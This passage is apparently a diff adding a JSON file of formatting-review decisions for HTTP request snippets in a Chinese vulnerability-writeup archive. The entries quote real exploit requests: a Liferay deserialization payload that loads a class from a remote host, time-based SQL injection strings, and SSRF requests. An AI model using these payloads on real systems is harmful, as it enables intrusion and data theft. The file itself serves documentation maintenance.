@@ -1,0 +1,500 @@
+[
+  {
+    "path": "Web安全/CMS内容/WordPress/Wordpress 4.9.6 任意文件删除漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /wp-admin/post.php?post=21&action=edit HTTP/1.1",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/CMS内容/WordPress/Wordpress 4.9.6 任意文件删除漏洞.md",
+        "kind": "unfenced_http",
+        "candidate": "POST /wp-admin/post.php?post=21&action=edit HTTP/1.1",
+        "disposition": "候选只有请求行；其后另起“payload:”文字，现有材料不能确认完整请求边界或头字段，保持原样。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+    "kind": "unfenced_http",
+    "raw": "POST /website/blog/ HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "POST /website/blog/ HTTP/1.1  ",
+        "disposition": "source_format_unknown",
+        "context_reason": "请求主体与 Content-Length: 16 对应，但每个头字段之间有仅含空格的 Markdown 空段；按原样围栏会把这些来源空段显示并复制成额外 HTTP 空行，无法声称为传输字节。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+    "kind": "unfenced_http",
+    "raw": "POST /_search?pretty HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+        "candidate_index": 1,
+        "kind": "unfenced_http",
+        "raw": "POST /_search?pretty HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "JSON 主体中出现原文省略标记“……”，不能据此包装为完整请求，也不补全。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      },
+      {
+        "worker": "residual-02",
+        "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+        "candidate_index": 2,
+        "kind": "unfenced_http",
+        "raw": "POST /_search?pretty HTTP/1.1  ",
+        "disposition": "source_format_unknown",
+        "context_reason": "主体周围及各行之间有多处仅含空格的 Markdown 空段，且截图紧邻；保留原样会复制这些源格式空段，移除则违反逐字保留要求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+    "kind": "unfenced_http",
+    "raw": "POST /_search?pretty HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+        "candidate_index": 1,
+        "kind": "unfenced_http",
+        "raw": "POST /_search?pretty HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "JSON 主体中出现原文省略标记“……”，不能据此包装为完整请求，也不补全。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      },
+      {
+        "worker": "residual-02",
+        "path": "Web安全/中间件/Elasticsearch/ElasticSearch命令执行漏洞之CVE-2012-3120.md",
+        "candidate_index": 2,
+        "kind": "unfenced_http",
+        "raw": "POST /_search?pretty HTTP/1.1  ",
+        "disposition": "source_format_unknown",
+        "context_reason": "主体周围及各行之间有多处仅含空格的 Markdown 空段，且截图紧邻；保留原样会复制这些源格式空段，移除则违反逐字保留要求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/中间件/Liferay/Liferay Portal代码执行.md",
+    "kind": "unfenced_http",
+    "raw": "POST /api/jsonws/invoke HTTP/1.1Host:  192.168.207.133:8080Content-Length: 1310Cache-Control:  max-age=0Upgrade-Insecure-Requests: 1Origin:  http://192.168.207.133:8080Content-Type:  application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/81.0.4044.122 Safari/537.36Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.207.133:8080/api/jsonws/invokeAccept-Encoding: gzip,  deflateAccept-Language: zh-CN,zh;q=0.9Cookie: COOKIE_SUPPORT=true;  GUEST_LANGUAGE_ID=zh_CN; JSESSIONID=87A005AED1F59A11F72BD5072F4CA2F3;  LFR_SESSION_STATE_20105=1587535682761Connection:  closecmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&tableId=1&name=2&type=3&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={“userOverridesAsString”:“HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e3230372e313a393030312f740003466f6f;”}\n",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/中间件/Liferay/Liferay Portal代码执行.md",
+        "kind": "unfenced_http",
+        "candidate": "POST /api/jsonws/invoke HTTP/1.1Host:  192.168.207.133:8080Content-Length: 1310Cache-Control:  max-age=0Upgrade-Insecure-Requests: 1Origin:  http://192.168.207.133:8080Content-Type:  application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/81.0.4044.122 Safari/537.36Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.207.133:8080/api/jsonws/invokeAccept-Encoding: gzip,  deflateAccept-Language: zh-CN,zh;q=0.9Cookie: COOKIE_SUPPORT=true;  GUEST_LANGUAGE_ID=zh_CN; JSESSIONID=87A005AED1F59A11F72BD5072F4CA2F3;  LFR_SESSION_STATE_20105=1587535682761Connection:  closecmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&tableId=1&name=2&type=3&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={“userOverridesAsString”:“HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c696645787074001a687474703a2f2f3139322e3136382e3230372e313a393030312f740003466f6f;”}\n",
+        "disposition": "候选是单个合并的 blockquote，HTTP/头/正文之间换行已丢失；不得猜测补全换行或拆分请求。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/其他软件/杂项/IT 服务管理软件 BMC FootPrints 被曝未授权 RCE 漏洞链（CVE-2025-71257 至 71260）.md",
+    "kind": "unfenced_http",
+    "raw": "GET /footprints/servicedesk/import/searchWeb?url=https://{{external-host}}&dataEncoding=x HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/其他软件/杂项/IT 服务管理软件 BMC FootPrints 被曝未授权 RCE 漏洞链（CVE-2025-71257 至 71260）.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "GET /footprints/servicedesk/import/searchWeb?url=https://{{external-host}}&dataEncoding=x HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "仅见请求行、Host 和 `SEC_TOKEN=...;` Cookie，未见完整请求材料；省略号是原始截略/占位，不推断或填充其余字段。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/其他软件/杂项/IT 服务管理软件 BMC FootPrints 被曝未授权 RCE 漏洞链（CVE-2025-71257 至 71260）.md",
+    "kind": "unfenced_http",
+    "raw": "GET /footprints/servicedesk/externalfeed/RSS?feedUrl=https://{{external-host}} HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/其他软件/杂项/IT 服务管理软件 BMC FootPrints 被曝未授权 RCE 漏洞链（CVE-2025-71257 至 71260）.md",
+        "candidate_index": 1,
+        "kind": "unfenced_http",
+        "raw": "GET /footprints/servicedesk/externalfeed/RSS?feedUrl=https://{{external-host}} HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "第二个 SSRF 示例同样只见请求行、Host 和带省略号的 Cookie；保持未知，不包装成完整请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/其他软件/杂项/【漏洞预警】wandb信息泄露漏洞(CVE-2024-4642).md",
+    "kind": "unfenced_http",
+    "raw": "POST /graphql HTTP/1.1Host: ip:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://ip:8080/settingscontent-type: application/jsonX-Origin: http://ip:8080Content-Length: 572Origin: http://ip:8080Connection: close{\"operationName\":\"TestGenericWebhookIntegration\",\"variables\":{\"entityName\":\"test\",\"urlEndpoint\":\"http://{your-IP}:4444\",\"requestPayload\":\"{\\n\\n\\n\\n\\n}\"},\"query\":\"mutation TestGenericWebhookIntegration($entityName: String!, $urlEndpoint: String!, $accessTokenRef: String, $secretRef: String, $requestPayload: JSONString) {\\n  testGenericWebhookIntegration(\\n    input: {entityName: $entityName, urlEndpoint: $urlEndpoint, accessTokenRef: $accessTokenRef, secretRef: $secretRef, requestPayload: $requestPayload}\\n  ) {\\n    ok\\n    response\\n    __typename\\n  }\\n}\\n\"}HTTP/1.1 200 OKServer: nginxDate: Mon, 18 Mar 2024 14:48:04 GMTContent-Type: application/json; charset=utf-8Content-Length: 201Connection: closeVary: OriginX-Content-Type-Options: nosniffX-Ratelimit-Limit: 1000X-Ratelimit-Remaining: 1000Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0{\"data\":{\"testGenericWebhookIntegration\":{\"ok\":true,\"response\":\"{\\\"response\\\":\\\"\\\\u003ch1\\\\u003eSSRF secret\\\\u003c/h1\\\\u003e\\\\n\\\",\\\"error\\\":\\\"\\\"}\",\"__typename\":\"TestGenericWebhookIntegrationPayload\"}}}**影响产品:**  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/其他软件/杂项/【漏洞预警】wandb信息泄露漏洞(CVE-2024-4642).md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "POST /graphql HTTP/1.1Host: ip:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://ip:8080/settingscontent-type: application/jsonX-Origin: http://ip:8080Content-Length: 572Origin: http://ip:8080Connection: close{\"operationName\":\"TestGenericWebhookIntegration\",\"variables\":{\"entityName\":\"test\",\"urlEndpoint\":\"http://{your-IP}:4444\",\"requestPayload\":\"{\\n\\n\\n\\n\\n}\"},\"query\":\"mutation TestGenericWebhookIntegration($entityName: String!, $urlEndpoint: String!, $accessTokenRef: String, $secretRef: String, $requestPayload: JSONString) {\\n  testGenericWebhookIntegration(\\n    input: {entityName: $entityName, urlEndpoint: $urlEndpoint, accessTokenRef: $accessTokenRef, secretRef: $secretRef, requestPayload: $requestPayload}\\n  ) {\\n    ok\\n    response\\n    __typename\\n  }\\n}\\n\"}HTTP/1.1 200 OKServer: nginxDate: Mon, 18 Mar 2024 14:48:04 GMTContent-Type: application/json; charset=utf-8Content-Length: 201Connection: closeVary: OriginX-Content-Type-Options: nosniffX-Ratelimit-Limit: 1000X-Ratelimit-Remaining: 1000Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0{\"data\":{\"testGenericWebhookIntegration\":{\"ok\":true,\"response\":\"{\\\"response\\\":\\\"\\\\u003ch1\\\\u003eSSRF secret\\\\u003c/h1\\\\u003e\\\\n\\\",\\\"error\\\":\\\"\\\"}\",\"__typename\":\"TestGenericWebhookIntegrationPayload\"}}}**影响产品:**  ",
+        "disposition": "unknown_source_boundary",
+        "context_reason": "一整行连续拼有 POST、头字段、JSON 请求体、HTTP 响应、JSON 响应和“影响产品”正文，没有能证实的原始边界；围栏会把解释和响应一并归入请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "请求含反引号包裹的 `<redacted>` Cookie/Authorization 占位符；定界符是原文 Markdown 行内代码语法。保留会让其显示成请求字符，剥除则违反原样约束。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 1,
+        "kind": "unfenced_http",
+        "raw": "GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "请求含反引号包裹的 `<redacted>` Cookie/Authorization；同时有仅空格的段落分隔。无法证明源格式空格是原始 HTTP 内容。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 2,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "createDraftWorkflow 示例中的 Cookie 与 Authorization 使用反引号定界的 `<redacted>`，不宜把源定界符误作报文字符。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      },
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 3,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2  ",
+        "disposition": "safe_to_fence",
+        "context_reason": "带 clientId 的请求有明确起止和闭合 JSON 主体，后面独立进入响应；仅建议围原文范围。空白行、尾随双空格及全角缩进均原样保留，不称作 HTTP 字节。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /v1/integrationPlatform/auth:setAcl HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 5,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/integrationPlatform/auth:setAcl HTTP/2  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "可见 Content-Length 为 500，而当前归档 JSON 主体不足该长度；不能断定请求完整，不修正该值或补内容。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /v1/projects/`<your-project>`/locations/us-central1/integrations/anythinghere/versions/`<victim-uuid>` HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 8,
+        "kind": "unfenced_http",
+        "raw": "GET /v1/projects/`<your-project>`/locations/us-central1/integrations/anythinghere/versions/`<victim-uuid>` HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "路径中的项目/UUID占位符和 Authorization 值以反引号定界。保留这些源定界符会将其作为围栏内容显示，不能做无损的可复制请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 9,
+        "kind": "unfenced_http",
+        "raw": "POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "请求体位置明确写 `< RAW PROTOBUF DATA >`，正文随后说明真正请求体是 protobuf；占位块不能视作完整原始请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 10,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "URL 项目占位符和 Bearer `<redacted>` 使用行内代码定界符；不剥除源定界符，也不把它们声称为报文字节。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 11,
+        "kind": "unfenced_http",
+        "raw": "GET /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "URL 项目占位符和 Bearer `<redacted>` 使用行内代码定界符；不剥除源定界符，也不把它们声称为报文字节。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 12,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "Authorization 的 `<redacted>` 有行内反引号，JSON 主体还有“...”省略内容，Content-Length 为 1033；来源不能证明该请求完整。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /v1/projects/`<project>`/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download HTTP/2  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/安全设备/Google/2026年还能让Google掏出百万奖金的漏洞.md",
+        "candidate_index": 13,
+        "kind": "unfenced_http",
+        "raw": "GET /v1/projects/`<project>`/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download HTTP/2  ",
+        "disposition": "unknown_markdown_delimiters",
+        "context_reason": "路径占位符与 Bearer `<redacted>` 由反引号定界，且该行后直接接解释；不能安全围成无损请求样例。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/数据库/PostgreSQL/CVE-2025-30936 SQL注入.md",
+    "kind": "unfenced_http",
+    "raw": "POST /wp-管理员/管理员-AJAX.php HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/数据库/PostgreSQL/CVE-2025-30936 SQL注入.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "POST /wp-管理员/管理员-AJAX.php HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "同一路径在正文出现两个相似示例；候选请求行的上下文都使用 Host: localhost、`...` 与 cookie_here 代替字段/值，并以源空段分隔。它们是节选，不能恢复成完整请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=upcoming&ob=tB.status,(SELECT+SLEEP(10))&dir=ASC HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+        "kind": "unfenced_http",
+        "candidate": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=upcoming&ob=tB.status,(SELECT+SLEEP(10))&dir=ASC HTTP/1.1  ",
+        "disposition": "3处均只是嵌在段落中的请求行/载荷摘录，后接解释、图片或结论，不是完整 HTTP 请求块。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(ORD(SUBSTRING(数据库(),1,1))=119,SLEEP(5),0))&dir=ASC HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+        "kind": "unfenced_http",
+        "candidate": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(ORD(SUBSTRING(数据库(),1,1))=119,SLEEP(5),0))&dir=ASC HTTP/1.1  ",
+        "disposition": "3处均只是嵌在段落中的请求行/载荷摘录，后接解释、图片或结论，不是完整 HTTP 请求块。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(SUBSTRING(数据库(),1,1)=0x77,SLEEP(5),0))&dir=ASC HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/数据库/PostgreSQL/CVE-2025-39566 sql注入漏洞.md",
+        "kind": "unfenced_http",
+        "candidate": "GET /wp-管理员/管理员.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(SUBSTRING(数据库(),1,1)=0x77,SLEEP(5),0))&dir=ASC HTTP/1.1  ",
+        "disposition": "3处均只是嵌在段落中的请求行/载荷摘录，后接解释、图片或结论，不是完整 HTTP 请求块。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/数据库/PostgreSQL/CVE-2025-48281 SQL注入.md",
+    "kind": "unfenced_http",
+    "raw": "GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/数据库/PostgreSQL/CVE-2025-48281 SQL注入.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "该候选请求行后 Host 用 `...`、Cookie 用 cookie_here 表示；同节前一相似请求也为节选。缺失字段不推断。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/网络设备/D-Link/(9.1分) CVE-2026-93958：D-Link R95 路由器命令注入.md",
+    "kind": "unfenced_http",
+    "raw": "POST /DHMAPI/ HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/网络设备/D-Link/(9.1分) CVE-2026-93958：D-Link R95 路由器命令注入.md",
+        "kind": "unfenced_http",
+        "candidate": "POST /DHMAPI/ HTTP/1.1  ",
+        "disposition": "登录处是关键头节选，原文明示请求体为 SOAP XML 且以图片承载证据；不围栏成完整请求。取回输出处的 GET/Host 完整两行建议围栏。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
+    "path": "Web安全/网络设备/H3C/H3Chttp服务器 weblogin SQL注入漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "POST /web/login HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-01",
+        "path": "Web安全/网络设备/H3C/H3Chttp服务器 weblogin SQL注入漏洞.md",
+        "kind": "unfenced_http",
+        "candidate": "POST /web/login HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br, zstd\nConnection: keep-alive",
+        "disposition": "请求行、头和正文含 Markdown 转义引号；围栏会令反斜线可见，不能把当前显示值等同请求字节，保留原文。",
+        "manual_context_review": true
+      }
+    ]
+  },
+  {
